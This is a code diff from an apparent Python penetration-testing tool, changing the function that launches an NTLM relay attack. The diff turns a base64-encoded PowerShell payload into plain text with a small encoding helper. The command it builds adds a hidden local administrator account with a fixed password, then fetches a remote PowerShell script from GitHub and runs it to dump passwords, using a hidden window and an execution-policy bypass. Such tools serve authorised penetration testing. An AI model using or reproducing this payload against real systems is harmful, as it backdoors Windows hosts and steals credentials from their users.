@@ -965,8 +965,9 @@ def run_relay_attack(iface, args):
     elif args.auto:
         remote_cmd = run_empire_deathstar(iface, args)
     else:
-        # net user /add icebreaker P@ssword123456; net localgroup administrators icebreaker /add; IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/DanMcInerney/Obf-Cats/master/Obf-Cats.ps1'); Obf-Cats -pwds
-        remote_cmd = 'powershell -nop -exec bypass -w hidden -enc bgBlAHQAIAB1AHMAZQByACAALwBhAGQAZAAgAGkAYwBlAGIAcgBlAGEAawBlAHIAIABQAEAAcwBzAHcAbwByAGQAMQAyADMANAA1ADYAOwAgAG4AZQB0ACAAbABvAGMAYQBsAGcAcgBvAHUAcAAgAGEAZABtAGkAbgBpAHMAdAByAGEAdABvAHIAcwAgAGkAYwBlAGIAcgBlAGEAawBlAHIAIAAvAGEAZABkADsAIABJAEUAWAAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQAuAEQAbwB3AG4AbABvAGEAZABTAHQAcgBpAG4AZwAoACcAaAB0AHQAcABzADoALwAvAHIAYQB3AC4AZwBpAHQAaAB1AGIAdQBzAGUAcgBjAG8AbgB0AGUAbgB0AC4AYwBvAG0ALwBEAGEAbgBNAGMASQBuAGUAcgBuAGUAeQAvAE8AYgBmAC0AQwBhAHQAcwAvAG0AYQBzAHQAZQByAC8ATwBiAGYALQBDAGEAdABzAC4AcABzADEAJwApADsAIABPAGIAZgAtAEMAYQB0AHMAIAAtAHAAdwBkAHMADQAKAA=='
+        text_cmd = "net user /add icebreaker P@ssword123456; net localgroup administrators icebreaker /add; IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/DanMcInerney/Obf-Cats/master/Obf-Cats.ps1'); Obf-Cats -pwds"
+        enc_cmd = encode_for_ps(text_cmd)
+        remote_cmd = 'powershell -nop -exec bypass -w hidden -enc {}'.format(enc_cmd)
 
     if os.path.isfile('smb-signing-disabled-hosts.txt'):
         signing_disabled = ' -tf smb-signing-disabled-hosts.txt'
@@ -984,6 +985,10 @@ def run_relay_attack(iface, args):
     ntlmrelay_proc = run_proc(relay_cmd)
 
     return resp_proc, ntlmrelay_proc
+
+def encode_for_ps(cmd):
+    win_b64_cmd = base64.b64encode(cmd.encode('UTF-16LE')).decode('utf-8')
+    return win_b64_cmd
 
 def follow_file(thefile):
     '''
